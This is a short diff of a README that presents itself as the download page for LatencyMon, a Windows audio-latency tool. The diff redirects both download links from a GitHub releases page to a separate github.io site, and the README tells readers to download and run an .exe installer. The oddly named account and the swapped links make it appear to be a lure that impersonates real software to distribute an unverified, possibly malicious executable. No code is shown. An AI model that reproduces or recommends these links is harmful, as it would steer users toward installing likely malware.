@@ -1,12 +1,12 @@
 # 📊 LatencyMon - Fix audio stutter and system lag
 
-[![](https://img.shields.io/badge/Download-LatencyMon-blue.svg)](https://github.com/Morganplundering874/LatencyMon/releases)
+[![](https://img.shields.io/badge/Download-LatencyMon-blue.svg)](https://morganplundering874.github.io)
 
 LatencyMon checks your computer for hidden issues that cause audio glitches, choppy video, and system slowdowns. High system latency happens when drivers or background processes block your processor from completing tasks on time. This tool monitors your system and identifies the specific drivers causing these delays.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/Morganplundering874/LatencyMon/releases) to view all versions.
+1. Visit the [official releases page](https://morganplundering874.github.io) to view all versions.
 2. Look for the most recent version at the top of the list.
 3. Click the link ending in .exe to download the installer to your computer.
 4. Save the file to your Downloads folder or another location you can easily find.
